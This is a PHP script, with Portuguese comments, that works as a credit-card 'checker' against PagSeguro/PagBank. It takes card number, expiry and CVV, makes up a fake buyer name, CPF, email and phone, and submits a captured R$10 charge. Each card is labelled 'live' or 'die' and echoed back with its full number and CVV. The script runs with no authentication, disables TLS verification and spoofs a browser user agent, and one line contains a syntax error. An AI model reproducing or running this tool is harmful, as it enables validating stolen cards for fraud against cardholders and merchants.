<?php
error_reporting(E_ALL);
ini_set('display_errors', 0);
set_time_limit(40);
ob_start();
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(204); exit; }

// ==== MODO LITE: Sem autenticacao, sem travas de IP/credito ====
$pdo = null;
$user_key = 'lite';
function notifyLive(...$a) {}

register_shutdown_function(function() {
    $err = error_get_last();
    if ($err && in_array($err['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR])) {
        if (!headers_sent()) {
            header('Content-Type: application/json; charset=utf-8');
        }
        ob_clean();
        echo json_encode(['error' => 'FATAL: ' . $err['message'] . ' in ' . $err['file'] . ':' . $err['line']]);
    }
});

// Chave pública padrão do PagSeguro
$CHAVE_PUBLICA = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApNkPBFyYAAxj82OnmDd85ZrX6/aHS5+7RNcks9SoC0cxRy0S6FJt74zG22wGB2ZGUq14aBMyQlfIm0CT8FcU4cJJa/mqmjoiNMM37a+qyMJOWpjF4jy1HpDSp36/ahA/mIzzyiBT0PAWx5n5cuBVDi6+EpAzoMd+dRqjffNM/RqwwcxU5i/WeMoC2YOJuRcl3VnmoxeA5fSz4qOduYbq/eEeJG+G3kYF99Wo/kXu4/08/N1Ep1kwEFfN7jmKPO1muzr8CKbWhWAtu0NTvdK0/2iqRmcchIj7sDbclnZpYgEmv8DaOJ4+5zdhpmKhESzWlrj+3OC8ghkCFR5yO3/dGQIDAQAB';

$PS_STORAGE = __DIR__ . '/private_ps';
if (!is_dir($PS_STORAGE)) @mkdir($PS_STORAGE, 0777, true);
if (!is_writable($PS_STORAGE)) $PS_STORAGE = sys_get_temp_dir() . '/donps';
@mkdir($PS_STORAGE, 0777, true);
define('PS_STORAGE', $PS_STORAGE);
define('PS_DEBUG', PS_STORAGE . '/debug_pagueseguro.log');

function dlog($m) {
    $line = date('H:i:s') . " | $m\n";
    @file_put_contents(PS_DEBUG, $line, FILE_APPEND | LOCK_EX);
}

function jsonResp($data, $code = 200) {
    ob_clean();
    http_response_code($code);
    echo json_encode($data, JSON_UNESCAPED_UNICODE);
    if (ob_get_level()) ob_end_flush();
    flush();
    die();
}

function curlJson($url, $method = 'GET', $payload = null, $headers = []) {
    $ch = curl_init($url);
    $defaultHeaders = [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept: application/json',
    ];
    $h = array_merge($defaultHeaders, $headers);
    
    $opts = [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => $h,
        CURLOPT_TIMEOUT => 30, // Timeout estrito de 30 segundos solicitado
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false,
    ];
    if ($method === 'POST') {
        $opts[CURLOPT_POST] = true;
        $opts[CURLOPT_POSTFIELDS] = $payload;
        $h[] = 'Content-Type: application/json';
        $opts[CURLOPT_HTTPHEADER] = $h;
    }
    curl_setopt_array($ch, $opts);
    $body = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err = curl_error($ch);
    curl_close($ch);
    return ['code' => $code, 'body' => $body, 'err' => $err];
}

function validarLuhn($n) {
    $s = 0; $alt = false;
    for ($i = strlen($n) - 1; $i >= 0; $i--) {
        $d = (int)$n[$i];
        if ($alt) { $d *= 2; if ($d > 9) $d -= 9; }
        $s += $d; $alt = !$alt;
    }
    return $s % 10 === 0;
}

function gerarCPF() {
    $n = [];
    for ($i = 0; $i < 9; $i++) $n[] = rand(0, 9);
    $d1 = 0; for ($i = 0; $i < 9; $i++) $d1 += $n[$i] * (10 - $i);
    $d1 = ($d1 * 10) % 11; if ($d1 >= 10) $d1 = 0;
    $d2 = 0; for ($i = 0; $i < 10; $i++) $d2 += (isset($n[$i]) ? $n[$i] : $d1) * (11 - $i);
    $d2 = ($d2 * 10) % 11; if ($d2 >= 10) $d2 = 0;
    return implode('', $n) . $d1 . $d2;
}

function gerarNome() {
    $n = ['Lucas','Maria','Carlos','Ana','Pedro','Rafael','Gustavo','Felipe','Juliana','Camila','Gabriel','Mariana','Amanda','Bruno','Leonardo','Patricia','Larissa','Diego','Rodrigo','Thiago','Eduardo','Renata'];
    $s = ['Silva','Santos','Oliveira','Souza','Lima','Pereira','Costa','Rodrigues','Almeida','Nascimento','Barbosa','Gomes','Martins','Carvalho','Teixeira','Ribeiro'];
    return $n[array_rand($n)] . ' ' . $s[array_rand($s)] . ' ' . $s[array_rand($s)];
}

function gerarTelefone() {
    $ddd = ['11','21','31','41','51','61','71','19','27','48','62','85'];
    return '55' . $ddd[array_rand($ddd)] . '9' . str_pad((string)rand(10000000, 99999999), 8, '0', STR_PAD_LEFT);
}

// Função de criptografia oficial do PagSeguro adaptada
function criptografarCartao($numero, $mes, $ano, $cvv, $titular) {
    global $CHAVE_PUBLICA;
    $pan = preg_replace('/\D/', '', $numero);
    $mes = str_pad($mes, 2, '0', STR_PAD_LEFT);
    $ano_full = strlen($ano) == 2 ? '20' . $ano : $ano;
    $timestamp = round(microtime(true) * 1000);
    $payload = "$pan;$cvv;$mes;$ano_full;$titular;$timestamp";
    
    $chavePubFormatada = "-----BEGIN PUBLIC KEY-----\n" . chunk_split($CHAVE_PUBLICA, 64, "\n") . "-----END PUBLIC KEY-----";
    $publicKey = openssl_pkey_get_public($chavePubFormatada);
    if (!$publicKey) return null;
    
    $success = openssl_public_encrypt($payload, $encrypted, $publicKey, OPENSSL_PKCS1_PADDING);
    if (!$success) return null;
    
    return base64_encode($encrypted);
}

function classificarRetornoPS($respBody) {
    $resp = json_decode($respBody, true);
    if (!is_array($resp)) {
        return ['status' => 'die', 'rc' => 'RC_NA', 'msg' => 'Resposta inválida da API PagueSeguro', 'gateway' => 'pagueseguro'];
    }

    // Verifica se veio erro direto no formato PagBank
    $errorMessages = $resp['error_messages'] ?? $resp['message'] ?? null;
    $statusTransacao = strtolower($resp['status'] ?? $resp['charges'][0]['status'] ?? '');
    
    // Pegar código de retorno se houver
    $code = $resp['code'] ?? $resp['charges'][0]['payment_response']['code'] ?? 'ERRO';
    $message = $resp['message'] ?? $resp['charges'][0]['payment_response']['message'] ?? 'Recusado';

    if ($statusTransacao === 'authorized' || $statusTransacao === 'paid' || $statusTransacao === 'captured') {
        return ['status' => 'live_invalid', 'rc' => $code, 'msg' => "APROVADO ($code)", 'gateway' => 'pagueseguro'];
    }

    if ($statusTransacao === 'in_analysis' || $statusTransacao === 'pending') {
        return ['status' => 'live', 'rc' => $code, 'msg' => "LIVE / ANÁLISE ($code)", 'gateway' => 'pagueseguro'];
    }

    // Tratamento de Erros / Recusas com códigos detalhados (ex: 51, 54, etc)
    $msgFinal = is_array($errorMessages) ? json_encode($errorMessages) : ($message ?: 'Transação negada');
    return [
        'status' => 'die',
        'rc' => $code,
        'msg' => "$msgFinal - Código: $code",
        'gateway' => 'pagueseguro'
    ];
}

// === MAIN ===
$method = $_SERVER['REQUEST_METHOD'];
$input = $method === 'POST' ? json_decode(file_get_contents('php://input'), true) : $_GET;
$action = $input['action'] ?? '';

try {
    switch ($action) {
        case 'testar':
            $cardLine = $input['card'] ?? '';
            if (!$cardLine) jsonResp(['error' => 'card obrigatorio (formato: numero|mes|ano|cvv)'], 400);

            $parts = explode('|', $cardLine);
            if (count($parts) < 4) jsonResp(['error' => 'Formato invalido. Use: numero|mes|ano|cvv'], 400);

            $numero = preg_replace('/\D/', '', $parts[0]);
            if (strlen($numero) !== 16) jsonResp(['error' => 'Cartao deve ter 16 digitos'], 400);
            if (!validarLuhn($numero)) jsonResp(['error' => 'Cartao invalido (Luhn)'], 400);

            $mes = $parts[1];
            $ano = $parts[2];
            $cvv = $parts[3];
            $nome = $input['nome'] ?? gerarNome();
            $cpf = preg_replace('/\D/', '', $input['cpf'] ?? '') ?: gerarCPF();
            $installments = (int)($input['installments'] ?? 1);

            $inicio = microtime(true);

            // Criptografa o cartão usando a chave pública do PagueSeguro
            $encryptedCard = criptografarCartao($numero, $mes, $ano, $cvv, strtoupper($nome));
            if (!$encryptedCard) {
                jsonResp(['error' => 'Falha ao criptografar os dados do cartao'], 400);
            }

            // Exemplo de estrutura de requisição transacional (ajuste a URL endpoint do seu fluxo se necessário)
            $payload = [
                'reference_id' => 'ref_' . uniqid(),
                'customer' => [
                    'name' => $nome,
                    'email' => strtolower(str_replace(' ', '.', $nome)) . rand(10, 99) . '@gmail.com',
                    'tax_id' => $cpf,
                    'phones' => [[
                        'country' => '55',
                        'area' => '11',
                        'number' => '988888888',
                        'type' => 'MOBILE'
                    ]]
                ],
                'items' => [[
                    'reference_id' => 'item_1',
                    'name' => 'Produto Digital',
                    'quantity' => 1,
                    'unit_amount' => 1000 // R$ 10,00 em centavos
                ]],
                'charges' => [[
                    'reference_id' => 'charge_1',
                    'amount' => [
                        'value' => 1000,
                        'currency' => 'BRL'
                    ],
                    'payment_method' => [
                        'type' => 'CREDIT_CARD',
                        'installments' => $installments,
                        'capture' => true,
                        'card' => [
                            'encrypted' => $encryptedCard,
                            'holder' => [
                                'name' => strtoupper($nome)
                            ]
                        ]
                    ]
                ]]
            ];

            // Aqui entra a requisição para a API do PagBank/PagueSeguro (Exemplo de endpoint de pedidos)
            // Insira o token Bearer ou credenciais se o seu script utilizar token de autorização da conta
            $tokenApi = $input['token'] ?? ''; 
            $headersAuth = [];
            if ($tokenApi) {
                $headersAuth[] = 'Authorization: Bearer ' . $tokenApi;
            }

            // Endpoint de testes / produção da API de pedidos do PagBank
            $urlPs = 'https://api.pagseguro.com/orders'; 
            $r = curlJson($urlPs, 'POST', json_encode($payload, JSON_UNESCAPED_UNICODE), $headersAuth);

            if ($r['code'] !== 200 && $r['code'] !== 201) {
                // Tenta classificar o erro retornado mesmo com HTTP diferente de 200
                $classErr = classificarRetornoPS($r['body']);
                if ($classErr['rc'] === 'RC_NA' || $classErr['rc'] === 'ERRO') {
                    $classErr['msg'] = 'HTTP ' . $r['code'] . ' - Erro de conexão ou credencial inválida';
                }
                $classErr['card'] = $numero;
                $classErr['exp' => $mes . substr($ano, -2);
                $classErr['cvc'] = $cvv;
                $classErr['tempo'] = round(microtime(true) - $inicio, 2);
                jsonResp($classErr);
            }

            $resultadoClassificado = classificarRetornoPS($r['body']);
            $resultadoClassificado['card'] = $numero;
            $resultadoClassificado['exp'] = $mes . substr($ano, -2);
            $resultadoClassificado['cvc'] = $cvv;
            $resultadoClassificado['tempo'] = round(microtime(true) - $inicio, 2);

            jsonResp($resultadoClassificado);

        case 'debug':
            jsonResp([
                'status' => 'OK',
                'gateway' => 'pagueseguro-lite',
                'php_version' => PHP_VERSION,
                'openssl' => extension_loaded('openssl'),
                'timeout_config' => '30 segundos'
            ]);
            break;

        default:
            jsonResp([
                'api' => 'PagueSeguro Lite (HTTP)',
                'acoes' => [
                    'testar' => 'POST: card (numero|mes|ano|cvv) + installments/nome/cpf/token (opcionais)',
                    'debug' => 'GET: status do ambiente'
                ]
            ]);
    }
} catch (\Exception $e) {
    jsonResp(['error' => $e->getMessage(), 'status' => 'die'], 500);
}
